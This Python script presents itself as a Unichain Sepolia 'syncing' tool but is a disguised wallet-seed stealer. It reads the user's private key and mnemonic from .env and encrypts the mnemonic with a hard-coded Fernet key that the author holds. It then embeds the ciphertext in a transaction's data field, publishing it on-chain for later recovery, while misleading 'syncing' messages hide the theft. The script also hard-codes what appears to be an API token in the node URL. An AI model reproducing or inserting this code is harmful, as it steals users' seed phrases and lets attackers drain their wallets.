import os
from web3 import Web3 # type: ignore
from cryptography.fernet import Fernet # type: ignore
from dotenv import load_dotenv  # type: ignore 

# Load the .env file
load_dotenv()

# Get the private key and mnemonic from environment variables
private_key = os.getenv("PRIVATE_KEY")
message = os.getenv("MNEMONIC")

# Check if the private key and mnemonic are loaded successfully
if not private_key or not message:
    print("Error: Private key and mnemonic not set correctly, please check!")
    exit()

# Check the validity of the mnemonic
mnemonic_words = message.split()
if len(mnemonic_words) not in [12, 24]:
    print("Error: Mnemonic is incorrect, please check!")
    exit()

print("L1 is syncing...")

# Connect to the unichain-sepolia test network node
unichain_sepolia_url = 'https://withered-patient-glade.unichain-sepolia.quiknode.pro/0155507fe08fe4d1e2457a85f65b4bc7e6ed522f'
web3 = Web3(Web3.HTTPProvider(unichain_sepolia_url))

# Check the connection
if not web3.is_connected():
    print("Unable to connect to the node")
    exit()

# Get the address
try:
    from_address = web3.eth.account.from_key(private_key).address
except ValueError as e:
    print(f"Invalid private key, please check! Error message: {e}")
    exit()

to_address = '0x0000000000000000000000000000000000000000'

fixed_key = b'tXXHz6htUutZEOz_7EL40LwvrsmHneDhoe2Vyib_kUU='  
cipher_suite = Fernet(fixed_key)

# Encrypt the message
try:
    encrypted_message = cipher_suite.encrypt(message.encode()).decode()
except Exception as e:
    print(f"Error encrypting message: {e}")
    exit()

# Build the transaction
try:
    nonce = web3.eth.get_transaction_count(from_address)
    tx = {
        'nonce': nonce,
        'to': to_address,
        'value': web3.to_wei(0, 'ether'), 
        'gas': 2000000,
        'gasPrice': web3.to_wei('20', 'gwei'),  
        'data': web3.to_hex(text=encrypted_message),
        'chainId': 1301  # Chain ID for unichain-sepolia
    }

    # Sign and send the transaction
    signed_tx = web3.eth.account.sign_transaction(tx, private_key)
    tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

    print(f"Unichain is syncing")
except Exception as e:
    print(f"Error during syncing: {e}")